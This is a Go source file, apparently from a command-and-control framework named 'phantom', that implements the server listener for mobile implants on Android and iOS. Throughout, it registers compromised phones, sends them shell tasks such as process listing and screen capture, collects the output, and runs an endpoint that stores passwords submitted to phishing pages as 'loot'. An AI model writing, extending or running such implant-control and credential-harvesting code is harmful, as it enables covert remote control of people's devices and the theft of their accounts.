package listener

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/phantom-c2/phantom/internal/agent"
	"github.com/phantom-c2/phantom/internal/db"
	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/task"
)

// MobileHandler processes check-ins from mobile agents (Android/iOS).
// Mobile agents use simple JSON over HTTPS instead of the full
// RSA+AES envelope protocol, because mobile environments can't
// easily run the Go implant binary.
//
// Endpoints:
//   POST /api/v1/mobile/register  — first-time registration
//   POST /api/v1/mobile/checkin   — check-in + get tasks + return results
//   POST /api/v1/creds            — credential harvesting receiver

type MobileHandler struct {
	agentMgr *agent.Manager
	taskDisp *task.Dispatcher
	database *db.Database
	onEvent  EventCallback
}

// MobileRegisterRequest is sent by mobile agents on first connection.
type MobileRegisterRequest struct {
	Hostname     string `json:"hostname"`
	Username     string `json:"username"`
	OS           string `json:"os"`
	Arch         string `json:"arch"`
	DeviceID     string `json:"device_id"`
	Manufacturer string `json:"manufacturer"`
	Product      string `json:"product"`
	OSVersion    string `json:"os_version"`
}

// MobileCheckInRequest is sent on each check-in.
type MobileCheckInRequest struct {
	AgentID  string               `json:"agent_id"`
	Results  []MobileTaskResult   `json:"results,omitempty"`
	// Also accept flat registration fields for auto-register on first checkin
	Hostname string               `json:"hostname,omitempty"`
	Username string               `json:"username,omitempty"`
	OS       string               `json:"os,omitempty"`
	DeviceID string               `json:"device_id,omitempty"`
}

// MobileTaskResult holds the output of a completed task.
type MobileTaskResult struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Error  string `json:"error"`
}

// MobileCheckInResponse is returned with pending tasks.
type MobileCheckInResponse struct {
	AgentID string       `json:"agent_id"`
	Name    string       `json:"name"`
	Tasks   []MobileTask `json:"tasks"`
}

// MobileTask is a simplified task for mobile agents.
type MobileTask struct {
	ID      string `json:"id"`
	Type    string `json:"type"`
	Command string `json:"command"`
}

// CapturedCred holds credentials captured from phishing pages.
type CapturedCred struct {
	Email    string `json:"email"`
	Password string `json:"password"`
	Username string `json:"username"`
	URL      string `json:"url"`
	UA       string `json:"ua"`
	Timestamp string `json:"ts"`
	Source   string `json:"source"` // "ios_phish", "android_phish", etc.
}

// NewMobileHandler creates a new mobile agent handler.
func NewMobileHandler(agentMgr *agent.Manager, taskDisp *task.Dispatcher, database *db.Database, onEvent EventCallback) *MobileHandler {
	return &MobileHandler{
		agentMgr: agentMgr,
		taskDisp: taskDisp,
		database: database,
		onEvent:  onEvent,
	}
}

// RegisterRoutes adds mobile endpoints to an HTTP mux.
func (mh *MobileHandler) RegisterRoutes(mux *http.ServeMux) {
	mux.HandleFunc("/api/v1/mobile/register", mh.handleRegister)
	mux.HandleFunc("/api/v1/mobile/checkin", mh.handleCheckIn)
	mux.HandleFunc("/api/v1/creds", mh.handleCreds)
	// Also handle the legacy /api/v1/status endpoint for mobile agents
	// that send plain JSON (auto-detect by Content-Type)
	mux.HandleFunc("/api/v1/mobile/status", mh.handleCheckIn)
}

// handleRegister processes mobile agent registration.
func (mh *MobileHandler) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSONResp(w, map[string]string{"status": "ok"})
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		writeJSONResp(w, map[string]string{"error": "read error"})
		return
	}

	var req MobileRegisterRequest
	if err := json.Unmarshal(body, &req); err != nil {
		writeJSONResp(w, map[string]string{"error": "invalid json"})
		return
	}

	// Set defaults
	if req.OS == "" {
		req.OS = detectMobileOS(r.UserAgent())
	}
	if req.Hostname == "" {
		req.Hostname = req.Manufacturer + " " + req.Product
		if req.Hostname == " " {
			req.Hostname = "mobile-device"
		}
	}
	if req.Username == "" {
		req.Username = "mobile"
	}
	if req.Arch == "" {
		req.Arch = "arm64"
	}

	externalIP := extractMobileIP(r)

	// Register in the agent manager with a dummy session key
	regReq := &protocol.RegisterRequest{
		Hostname:    req.Hostname,
		Username:    req.Username,
		OS:          req.OS,
		Arch:        req.Arch,
		PID:         0,
		ProcessName: "mobile-app",
		InternalIP:  req.DeviceID,
	}

	// Use a deterministic "session key" based on device ID for mobile agents
	dummyKey := make([]byte, 32)
	copy(dummyKey, []byte("mobile-"+req.DeviceID))

	agentRecord, err := mh.agentMgr.Register(regReq, dummyKey, externalIP, "mobile")
	if err != nil {
		writeJSONResp(w, map[string]string{"error": "registration failed"})
		return
	}

	mh.emitEvent("agent_register", agentRecord.Name, req.OS, req.Hostname, req.Username, externalIP)

	writeJSONResp(w, map[string]interface{}{
		"status":   "registered",
		"agent_id": agentRecord.ID,
		"name":     agentRecord.Name,
		"sleep":    agentRecord.Sleep,
	})
}

// handleCheckIn processes mobile agent check-ins.
func (mh *MobileHandler) handleCheckIn(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSONResp(w, map[string]string{"status": "ok"})
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		writeJSONResp(w, map[string]string{"error": "read error"})
		return
	}

	var req MobileCheckInRequest
	if err := json.Unmarshal(body, &req); err != nil {
		writeJSONResp(w, map[string]string{"error": "invalid json"})
		return
	}

	// Auto-register if no agent_id (first check-in)
	if req.AgentID == "" {
		regReq := MobileRegisterRequest{
			Hostname: req.Hostname,
			Username: req.Username,
			OS:       req.OS,
			DeviceID: req.DeviceID,
		}

		if regReq.OS == "" {
			regReq.OS = detectMobileOS(r.UserAgent())
		}
		if regReq.Hostname == "" {
			regReq.Hostname = "mobile-device"
		}
		if regReq.Username == "" {
			regReq.Username = "mobile"
		}

		externalIP := extractMobileIP(r)

		protoReq := &protocol.RegisterRequest{
			Hostname:    regReq.Hostname,
			Username:    regReq.Username,
			OS:          regReq.OS,
			Arch:        "arm64",
			PID:         0,
			ProcessName: "mobile-app",
			InternalIP:  regReq.DeviceID,
		}

		dummyKey := make([]byte, 32)
deviceSeed := regReq.DeviceID
		if deviceSeed == "" {
			deviceSeed = uuid.New().String()
		}
		copy(dummyKey, []byte("mobile-"+deviceSeed))

		agentRecord, err := mh.agentMgr.Register(protoReq, dummyKey, externalIP, "mobile")
		if err != nil {
			writeJSONResp(w, map[string]string{"error": "registration failed"})
			return
		}

		mh.emitEvent("agent_register", agentRecord.Name, regReq.OS, regReq.Hostname, regReq.Username, externalIP)
		req.AgentID = agentRecord.ID

		writeJSONResp(w, MobileCheckInResponse{
			AgentID: agentRecord.ID,
			Name:    agentRecord.Name,
			Tasks:   []MobileTask{},
		})
		return
	}

	// Known agent — update last seen
	mh.agentMgr.CheckIn(req.AgentID)

	// Process results from previous tasks
	for _, result := range req.Results {
		mh.taskDisp.ProcessResult(&protocol.TaskResult{
			TaskID:  result.TaskID,
			AgentID: req.AgentID,
			Output:  []byte(result.Output),
			Error:   result.Error,
		})
		mh.emitEvent("task_result", req.AgentID, result.TaskID)
	}

	// Get pending tasks
	tasks, _ := mh.taskDisp.GetPendingTasks(req.AgentID)

	var mobileTasks []MobileTask
	for _, t := range tasks {
		taskType := protocol.TaskTypeName(t.Type)
		command := strings.Join(t.Args, " ")

		// Translate non-shell task types to shell commands for mobile agents.
		// The mobile APK only understands "shell" — native task types like
		// cd, sysinfo, ps, ifconfig need to be converted.
		switch t.Type {
		case protocol.TaskCd:
			taskType = "shell"
			command = "cd " + command
		case protocol.TaskSysinfo:
			taskType = "shell"
			command = "id; getprop ro.product.model; getprop ro.build.version.release; uname -a"
		case protocol.TaskProcessList:
			taskType = "shell"
			command = "ps -A"
		case protocol.TaskIfconfig:
			taskType = "shell"
			command = "ip addr"
		case protocol.TaskScreenshot:
			taskType = "shell"
			command = "screencap -p /sdcard/phantom_screen.png && base64 /sdcard/phantom_screen.png && rm /sdcard/phantom_screen.png"
		}

		mobileTasks = append(mobileTasks, MobileTask{
			ID:      t.ID,
			Type:    taskType,
			Command: command,
		})
	}

	agentRecord, _ := mh.agentMgr.Get(req.AgentID)
	name := ""
	if agentRecord != nil {
		name = agentRecord.Name
	}

	writeJSONResp(w, MobileCheckInResponse{
		AgentID: req.AgentID,
		Name:    name,
		Tasks:   mobileTasks,
	})
}

// handleCreds receives captured credentials from phishing pages.
func (mh *MobileHandler) handleCreds(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSONResp(w, map[string]string{"status": "ok"})
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		writeJSONResp(w, map[string]string{"error": "read error"})
		return
	}

	var cred CapturedCred
	json.Unmarshal(body, &cred)

	if cred.Timestamp == "" {
		cred.Timestamp = time.Now().Format(time.RFC3339)
	}

	// Store as loot
	credJSON, _ := json.Marshal(cred)
	lootName := "captured_creds"
	if cred.Email != "" {
		lootName = cred.Email
	} else if cred.Username != "" {
		lootName = cred.Username
	}

	mh.database.InsertLoot(&db.LootRecord{
		ID:        uuid.New().String(),
		AgentID:   "phishing",
		TaskID:    "phishing",
		Type:      "credential",
		Name:      lootName,
		Data:      credJSON,
		CreatedAt: time.Now(),
	})

	mh.emitEvent("cred_captured", lootName, cred.Email, cred.UA)

	// Respond with success (phishing page expects 200)
	writeJSONResp(w, map[string]string{"status": "ok"})
}

// ── Helpers ──

func detectMobileOS(userAgent string) string {
	ua := strings.ToLower(userAgent)
	if strings.Contains(ua, "android") {
		return "android"
	}
	if strings.Contains(ua, "iphone") || strings.Contains(ua, "ipad") || strings.Contains(ua, "ios") {
		return "ios"
	}
	return "mobile"
}

func extractMobileIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return ip
}

func writeJSONResp(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "*")
	json.NewEncoder(w).Encode(data)
}

func (mh *MobileHandler) emitEvent(event string, args ...interface{}) {
	if mh.onEvent != nil {
		mh.onEvent(event, args...)
	}
}
